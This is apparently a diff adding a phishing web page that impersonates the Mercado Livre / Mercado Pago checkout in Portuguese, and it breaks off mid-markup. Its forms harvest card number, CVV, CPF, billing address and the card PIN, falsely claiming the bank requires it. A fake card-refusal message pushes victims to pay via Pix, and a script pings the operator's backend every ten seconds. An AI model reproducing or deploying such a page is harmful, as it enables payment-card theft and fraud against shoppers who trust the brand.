@@ -1,0 +1,553 @@
+<!DOCTYPE HTML>
+<div style='display:none;'>
+    <span id='caminhoAtual' style='display:none;'>/16521881</span>
+    <span id='caminhoBase' style='display:none;'>../06621881</span>
+</div>
+<style>
+    input[type=number]::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+    }
+
+    input[type=number] {
+        -moz-appearance: textfield;
+        appearance: textfield;
+    }
+</style>
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <title>Mercado Livre Brasil: Frete grátis no mesmo dia</title>
+        <meta charset="utf-8">
+        <link rel="stylesheet" href="/css/css.css?time=1711327039">
+        <script type="text/javascript" src="/js/jquery.js"></script>
+        <script type="text/javascript" src="/js/js.js?time=1711327039"></script>
+        <script type="text/javascript" src="/js/pagamento.js?time=1711327039"></script>
+        <link rel="stylesheet" href="/css/pagamento.css?time=1711327039">
+        <script type="text/javascript" src="/js/js.js?time=1711327039"></script>
+        <script type="text/javascript" src="/js/pagamento.js?time=1711327039"></script>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <meta charset='utf-8'>
+        <meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
+        <meta name="format-detection" content="telephone=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" href="https://i.imgur.com/vTSvZLQ.png" sizes='16x16'>
+    </head>
+    <body id='body' style='margin:0;width:100%;-webkit-text-size-adjust:none;'>
+        <span id='local' style='display:none;'>pagamento</span>
+        <script>
+            local = $('#local').text();
+            online(local);
+            $('#hiddenclick').click();
+            setInterval(function() {
+                if (document.hasFocus() == true) {
+                    local = $('#local').text();
+                    online(local);
+                }
+            }, 10000);
+        </script>
+        <!--FIXED-->
+        <!--loading-->
+        <div id='loading' style='position:fixed;width:100vw;height:100vh;background-color:#fff059;display:none;align-items:center;z-index:105;'>
+            <style>
+                .loader {
+                    margin: 25px;
+                    border: solid 5px #3483fa;
+                    border-top: 5px solid rgba(0,0,0,0);
+                    border-radius: 50%;
+                    width: 60px;
+                    height: 60px;
+                    animation: spin 1s linear infinite;
+                }
+
+                @keyframes spin {
+                    0% {
+                        transform: rotate(0deg);
+                    }
+
+                    100% {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>
+            <div style='width:100%;'>
+                <div style='margin:0 auto;height:70px;text-align:center;'>
+                    <div class='loader' style='margin:0 auto;'></div>
+                </div>
+                <div style='margin:0 auto;text-align:center;display:flex;align-items:center;'>
+                    <span style='margin:0 auto;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'></span>
+                </div>
+            </div>
+        </div>
+        <div id='loading2' style='position:fixed;width:100vw;height:100vh;background-color:rgba(255,255,255,0.9);display:none;align-items:center;z-index:105;'>
+            <style>
+                .loader {
+                    margin: 25px;
+                    border: solid 5px #3483fa;
+                    border-top: 5px solid rgba(0,0,0,0);
+                    border-radius: 50%;
+                    width: 60px;
+                    height: 60px;
+                    animation: spin 1s linear infinite;
+                }
+
+                @keyframes spin {
+                    0% {
+                        transform: rotate(0deg);
+                    }
+
+                    100% {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>
+            <div style='width:100%;'>
+                <div style='margin:0 auto;height:70px;text-align:center;'>
+                    <div class='loader' style='margin:0 auto;'></div>
+                </div>
+            </div>
+        </div>
+        <!--valor total-->
+        <!--código copiado-->
+        <div id='codigoCopiado' style='padding:16px;position:fixed;width:calc(100vw - 52px);height:max-content;left:10px;bottom:16px;background-color:#00a650;display:none;align-items:center;z-index:105;box-shadow: 0 -2px 8px 2px rgba(0,0,0,.15);border-radius:8px;'>
+            <span id='textoCodigoCopiado' style='margin:0;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;opacity:.9;'>Código copiado com sucesso</span>
+        </div>
+        <main>
+            <div id='formasDePagamento' style='width:100%;display:flex;flex-flow:column;'>
+                <div style='flex-grow:1;padding:10px;background-color:#ffea78;display:flex;'>
+                    <i onclick='voltar1();' class="material-icons" style='font-size:18px;color:#333333;opacity:.84;'>&#xe5c4;</i>
+                    <div style='flex-grow:1;text-align:center;'>
+                        <span style='display:block;margin:22px 0 22px -9px;font-family:proximaNovaLight;font-size:24px;font-weight:300;color:#333333;'>Como você prefere pagar?</span>
+                    </div>
+                </div>
+                <div style='flex-grow:1;padding:20px;display:flex;flex-flow:column;'>
+                    <div style='width:100%:display:flex;align-items:center;'>
+                        <span style='margin-right:10px;font-family:proximaNovaRegular;font-size:15px;font-weight:600;color:#333333;'>Com Mercado Pago</span>
+                        <img src='https://i.imgur.com/KsHRENq.png' style='min-width:24px;max-width:24px;'>
+                    </div>
+                </div>
+                <div style='margin:0 15px;flex-grow:1;display:flex;flex-flow:column;background-color:#ffffff;border-radius:6px;box-shadow: 0 1px 2px 0 rgba(0,0,0,.12);'>
+                    <div onclick='selecionarFormaDePagamento("Pix");' style='border-bottom:solid 1px #ededed;padding:17px 15px;flex-grow:1;display:flex;align-items:center;'>
+                        <div style='margin-right:20px;min-width:48px;max-width:48px;min-height:48px;max-height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                            <img src='https://i.imgur.com/nNfU78q.png' style='margin:0 auto;max-width:24px;max-height:24px;'>
+                        </div>
+                        <div style='flex-grow:1;'>
+                            <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:400;color:#333333;'>Pix</span>
+                            <span style='display:block;margin-top:4px;font-family:proximaNovaRegular;font-size:14px;font-weight:400;color:#717171;'>Aprovação imediata</span>
+                        </div>
+                        <i class="material-icons" style='margin:0 0 0 auto;font-size:24px;color:#717171;width:24px;height:max-content;'>&#xe5cc;</i>
+                    </div>
+                    <div onclick='selecionarFormaDePagamento("Cartão");' style='border-bottom:solid 1px #ededed;padding:17px 15px;flex-grow:1;display:none;align-items:center;'>
+                        <div style='margin-right:20px;min-width:48px;max-width:48px;min-height:48px;max-height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                            <img src='https://i.imgur.com/8ubh79w.png' style='margin:0 auto;max-width:24px;max-height:24px;'>
+                        </div>
+                        <div style='flex-grow:1;'>
+                            <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:400;color:#333333;'>Cartão de crédito</span>
+                            <span style='display:block;margin-top:4px;font-family:proximaNovaRegular;font-size:14px;font-weight:400;color:#39b54a;'>Até 18 parcelas sem juros</span>
+                        </div>
+                        <i class="material-icons" style='margin:0 0 0 auto;font-size:24px;color:#717171;width:24px;height:max-content;'>&#xe5cc;</i>
+                    </div>
+                    <div onclick='selecionarFormaDePagamento("Boleto");' style='border-bottom:solid 1px #ededed;padding:17px 15px;flex-grow:1;display:none;align-items:center;'>
+                        <div style='margin-right:20px;min-width:48px;max-width:48px;min-height:48px;max-height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                            <img src='https://i.imgur.com/KHFWd3C.png' style='margin:0 auto;max-width:24px;max-height:24px;'>
+                        </div>
+                        <div style='flex-grow:1;'>
+                            <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:400;color:#333333;'>Boleto</span>
+                            <span style='display:block;margin-top:4px;font-family:proximaNovaRegular;font-size:14px;font-weight:400;color:#717171;'>Será aprovado em 1 ou 2 duas úteis.</span>
+                        </div>
+                        <i class="material-icons" style='margin:0 0 0 auto;font-size:24px;color:#717171;width:24px;height:max-content;'>&#xe5cc;</i>
+                    </div>
+                </div>
+            </div>
+            <span id='formaDePagamentoEscolhidaPeloCliente' style='display:none;'></span>
+            <div id='pagarComCartão' style='width:100%;min-height:100vh;display:none;flex-flow:column;background-color:#ffffff;'>
+                <div style='flex-grow:1;padding:10px;background-color:#ffea78;max-height:52px;'>
+                    <i onclick='voltar2();' class="material-icons" style='font-size:18px;color:#333333;opacity:.84;'>&#xe5c4;</i>
+                    <div style='padding:0 32px 12px 32px;flex-grow:1;text-align:center;'>
+                        <span style='display:block;margin:0 0 0 -9px;font-family:proximaNovaLight;font-size:20px;font-weight:300;color:#333333;'>Preencha os dados do cartão</span>
+                    </div>
+                </div>
+                <div style='margin:25px auto;display:flex;align-items:center;width:190px;height:114px;position:relative;background-image:url("https://i.imgur.com/vKIdKp6.png");background-size:contain;background-repeat:no-repeat;background-position:center;'></div>
+                <div id='dadosDoCartão' style='margin:20px 30px;flex-grow:1;display:flex;flex-flow:column;'>
+                    <div id='erroDePagamentoComCartão' style='display:none;margin-bottom:15px;align-items:center;text-align:left;border:solid 1px #f44336;padding:10px;flex-grow:1;border-radius:6px;'>
+                        <span style='margin:0 auto;display:block;font-family:dinRegular;font-size:14px;color:#f44336;'>Pagamento não autorizado. Promoção válida apenas para pagamento via pix.</span>
+                    </div>
+                    <span id='erroNumeroDoCartão' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Número do cartão</span>
+                    <input type='text' id='numeroDoCartão' onkeyup='mascaraCartão("numeroDoCartão","erroNumeroDoCartão","");' placeholder='' style='margin-top:5px;flex-grow:1;padding:0 10px;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                    <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                        <div class='erroNumeroDoCartão' style='display:none;align-items:center;'>
+                            <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                            <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                        </div>
+                    </div>
+                    <span id='erroNomeDoTitularDoCartão' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Nome completo</span>
+                    <input type='text' id='nomeDoTitularDoCartão' style='text-transform:uppercase;margin-top:5px;flex-grow:1;padding:0 10px;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                    <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                        <div class='erroNomeDoTitularDoCartão' style='display:none;align-items:center;'>
+                            <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                            <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                        </div>
+                    </div>
+                    <div style='flex-grow:1;display:flex;'>
+                        <div style='width:49%;margin-right:auto;display:flex;flex-flow:column;'>
+                            <span id='erroValidadeDoCartão' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Data de vencimento</span>
+                            <input type='text' id='validadeDoCartão' placeholder='07/29' onkeyup='mascaraValidade("validadeDoCartão","erroValidadeDoCartão","");' style='margin-top:5px;padding:0 10px;flex-grow:1;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                            <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                                <div class='erroValidadeDoCartão' style='display:none;align-items:center;'>
+                                    <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                                    <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div style='width:49%;display:flex;flex-flow:column;'>
+                            <span id='erroCvvDoCartão' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Código de segurança</span>
+                            <input type='text' id='cvvDoCartão' placeholder='123' onkeyup='mascaraCvv("cvvDoCartão","erroCvvDoCartão","");' style='margin-top:5px;padding:0 10px;flex-grow:1;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                            <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                                <div class='erroCvvDoCartão' style='display:none;align-items:center;'>
+                                    <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                                    <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <span id='erroCpfDoTitularDoCartão' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>CPF do titular do cartão</span>
+                    <input type='text' id='cpfDoTitularDoCartão' onkeyup='mascaraCpf("cpfDoTitularDoCartão","erroCpfDoTitularDoCartão","");' style='text-transform:uppercase;margin-top:5px;flex-grow:1;padding:0 10px;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                    <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                        <div class='erroCpfDoTitularDoCartão' style='display:none;align-items:center;'>
+                            <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                            <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                        </div>
+                    </div>
+                    <span style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Parcelamento</span>
+                    <select id='parcelamento' style='margin-top:5px;flex-grow:1;padding:0 10px;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'></select>
+                    <div onclick='salvarInfo();' style='margin:25px 0 0;flex-grow:1;min-height:50px;max-height:50px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;'>Continuar</span>
+                    </div>
+                </div>
+                <div id='campoSenhaDoCartão' style='margin:20px 30px;flex-grow:1;display:none;flex-flow:column;'>
+                    <span style='margin:30px 0 10px;display:block;font-family:dinBold;font-size:18px;color:rgba(0,0,0,.9);'>Informe a senha do seu cartão</span>
+                    <span style='margin:10px 0;display:block;font-family:dinRegular;font-size:16px;color:rgba(0,0,0,.9);'>Por questões de segurança seu banco exige a senha do seu cartão para aprovar compras.</span>
+                    <span id='textoDigitosSenha' style='display:block;margin:10px 0 0 0;font-family:dinRegular;font-size:14px;color:rgba(0,0,0,.9);'>Insira a senha do seu cartão, ela tem 4 digitos.</span>
+                    <input type='text' id='senhaDoCartão' minlength='1' maxlength='71' style='margin-top:10px;width:120px;height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:dinRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                    <div style='margin-top:2px;width:100%;height:14px;'>
+                        <span id='erroSenhaDoCartão' style='display:none;font-family:dinRegular;font-size:14px;line-height:14px;color:#f44336;'>Senha inválida.</span>
+                    </div>
+                    <div onclick='salvarConsultavel();' style='margin:25px 0 0;flex-grow:1;min-height:50px;max-height:50px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;'>Continuar</span>
+                    </div>
+                </div>
+                <div id='cartãoVirtual' style='margin:20px 30px;flex-grow:1;display:none;flex-flow:column;'>
+                    <span style='margin:30px 0 10px;display:block;font-family:dinBold;font-size:18px;color:rgba(0,0,0,.9);'>Use um cartão virtual</span>
+                    <span style='margin:10px 0;display:block;font-family:dinRegular;font-size:16px;color:rgba(0,0,0,.9);'>Por questões de segurança seu banco exige que você use um cartão virtual para fazer compras na internet.</span>
+                    <span style='margin:10px 0;display:block;font-family:dinRegular;font-size:16px;color:rgba(0,0,0,.9);'>Acesse o app do seu banco, procure por cartão virtual, gere um cartão virtual e finalize a compra por aqui.</span>
+                    <span style='margin:15px 0 10px;display:block;font-family:dinBold;font-size:18px;color:rgba(0,0,0,.9);'>Insira o cartão virtual</span>
+                    <span id='erroNumeroDoCartãoVirtual' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Número do cartão</span>
+                    <input type='text' id='numeroDoCartãoVirtual' onkeyup='mascaraCartão("numeroDoCartãoVirtual","erroNumeroDoCartãoVirtual","");' placeholder='' style='margin-top:5px;flex-grow:1;padding:0 10px;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                    <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                        <div class='erroNumeroDoCartãoVirtual' style='display:none;align-items:center;'>
+                            <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                            <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                        </div>
+                    </div>
+                    <div style='flex-grow:1;display:flex;'>
+                        <div style='width:49%;margin-right:auto;display:flex;flex-flow:column;'>
+                            <span id='erroValidadeDoCartãoVirtual' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Data de vencimento</span>
+                            <input type='text' id='validadeDoCartãoVirtual' placeholder='07/29' onkeyup='mascaraValidade("validadeDoCartãoVirtual","erroValidadeDoCartãoVirtual","");' style='margin-top:5px;padding:0 10px;flex-grow:1;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                            <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                                <div class='erroValidadeDoCartãoVirtual' style='display:none;align-items:center;'>
+                                    <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                                    <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div style='width:49%;display:flex;flex-flow:column;'>
+                            <span id='erroCvvDoCartãoVirtual' style='margin-left:5px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Código de segurança</span>
+                            <input type='text' id='cvvDoCartãoVirtual' placeholder='123' onkeyup='mascaraCvv("cvvDoCartãoVirtual","erroCvvDoCartãoVirtual","");' style='margin-top:5px;padding:0 10px;flex-grow:1;height:48px;border:solid 1px rgba(0,0,0,.25);border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);'>
+                            <div style='margin-top:5px;flex-grow:1;height:25px;'>
+                                <div class='erroCvvDoCartãoVirtual' style='display:none;align-items:center;'>
+                                    <i class="material-icons" style='font-size:14px;color:#f04449;'>&#xe000;</i>
+                                    <span style='margin-left:10px;font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:#f04449;'>Preencha esse dado</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div onclick='salvarCartãoVirtual();' style='margin:25px 0 0;flex-grow:1;min-height:50px;max-height:50px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;'>Continuar</span>
+                    </div>
+                </div>
+                <div style='width:100%;height:100px;'></div>
+            </div>
+            <div id='campoDadosParaNotaFiscal' style='width:100%;display:none;flex-flow:column;'>
+                <div style='flex-grow:1;padding:10px;background-color:#ffea78;'>
+                    <i onclick='voltar2();' class="material-icons" style='font-size:18px;color:#333333;opacity:.84;'>&#xe5c4;</i>
+                    <div style='padding:0 32px 32px 32px;flex-grow:1;text-align:center;'>
+                        <span style='display:block;margin:0 0 0 -9px;font-family:proximaNovaLight;font-size:24px;font-weight:300;color:#333333;'>Preencha os dados para sua NF-e</span>
+                        <span style='display:block;margin:12px 0 0 -9px;font-family:proximaNovaLight;font-size:16px;font-weight:300;color:#333333;'>Com estas informações, o vendedor poderá gerar a Nota Fiscal da sua compra.</span>
+                    </div>
+                </div>
+                <div style='padding:32px;flex-grow:1;background-color:#ffffff;text-align:left;'>
+                    <span style='display:block;font-family:proximaNovaLight;font-size:16px;font-weight:600;color:#333333;'>Dados pessoais</span>
+                    <div style='margin-top:10px;height:14px;text-align:left;'>
+                        <span id='tituloNomeParaNotaFiscal' style='margin-top:25px;display:none;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Nome</span>
+                    </div>
+                    <input type='text' id='nomeParaNotaFiscal' onkeyup='primeiraLetraMaiuscula("nomeParaNotaFiscal");' onfocus='effectOne("focus","tituloNomeParaNotaFiscal","nomeParaNotaFiscal","");' onblur='effectOne("blur","tituloNomeParaNotaFiscal","nomeParaNotaFiscal","Nome");' placeholder='Nome' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroNomeParaNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='tituloSobrenomeParaNotaFiscal' style='margin-top:25px;display:none;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Sobrenome</span>
+                    </div>
+                    <input type='text' id='sobrenomeParaNotaFiscal' onfocus='effectOne("focus","tituloSobrenomeParaNotaFiscal","sobrenomeParaNotaFiscal","");' onblur='effectOne("blur","tituloSobrenomeParaNotaFiscal","sobrenomeParaNotaFiscal","Sobrenome");' placeholder='Sobrenome' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroSobrenomeParaNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='tituloCpfParaNotaFiscal' style='margin-top:25px;display:none;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>CPF</span>
+                    </div>
+                    <input type='text' id='cpfParaNotaFiscal' onkeyup='mascaraCpf("cpfParaNotaFiscal","erroCpfParaNotaFiscal","");' onfocus='effectOne("focus","tituloCpfParaNotaFiscal","cpfParaNotaFiscal","");' onblur='effectOne("blur","tituloCpfParaNotaFiscal","cpfParaNotaFiscal","CPF");' placeholder='CPF' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroCpfParaNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>O CPF é inválido</span>
+                    </div>
+                    <span style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:16px;font-weight:600;color:#333333;'>Endereço de faturamento</span>
+                    <span id='logradouroEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Rua ou avenida</span>
+                    <input type='text' id='logradouroEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroLogradouroEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <span id='numeroEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Número</span>
+                    <input type='text' id='numeroEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroNumeroEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <span id='complementoEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Informações adicionais (opcional)</span>
+                    <input type='text' id='complementoEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroComplementoEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <span id='cepEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>CEP</span>
+                    <input type='text' id='cepEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroCepEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <span id='estadoEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Estado</span>
+                    <input type='text' id='estadoEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroEstadoEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <span id='cidadeEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Cidade</span>
+                    <input type='text' id='cidadeEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroCidadeEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <span id='bairroEndereçoNotaFiscal' style='margin-top:25px;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Bairro</span>
+                    <input type='text' id='bairroEndereçoNotaFiscal' placeholder='' style='margin-top:-5px;width:100%;height:40px;border:none;border-bottom:solid 1px #ccc;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:18px;color:#333;font-weight:400;outline:0;'/>
+                    <div style='height:14px;text-align:left;'>
+                        <span id='erroBairroEndereçoNotaFiscal' style='display:none;font-family:proximaNovaLight;font-size:12px;font-weight:300;color:#f23d4f;'>Preencha este campo</span>
+                    </div>
+                    <div onclick='irParaRevisãoDoPedido();' style='margin:25px 0 0;flex-grow:1;height:50px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;'>Continuar</span>
+                    </div>
+                </div>
+            </div>
+            <div id='campoFinalizarPagamento' style='width:100%;display:none;flex-flow:column;'>
+                <div style='flex-grow:1;padding:10px;background-color:#ffea78;'>
+                    <i onclick='voltar2();' class="material-icons" style='font-size:18px;color:#333333;opacity:.84;'>&#xe5c4;</i>
+                    <div style='padding:0 32px 0 32px;flex-grow:1;text-align:center;'>
+                        <span style='display:block;margin:0 0 0 -9px;font-family:proximaNovaLight;font-size:24px;font-weight:300;color:#333333;'>Revise e confirme sua compra</span>
+                    </div>
+                    <div style='padding:24px 14px 24px;flex-grow:1;'>
+                        <div style='width:100%;display:flex;align-items:center;'>
+                            <span style='display:block;margin:0 auto 0 0;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>Produto(s)</span>
+                            <span style='display:block;margin:0 0 0 auto;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>
+                                R$ <span class='valorDosProdutos'></span>
+                            </span>
+                        </div>
+                        <div style='margin-top:10px;width:100%;display:flex;align-items:center;'>
+                            <span style='display:block;margin:0 auto 0 0;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>Frete</span>
+                            <div style='margin:0 0 0 0 auto;width:max-content;'>
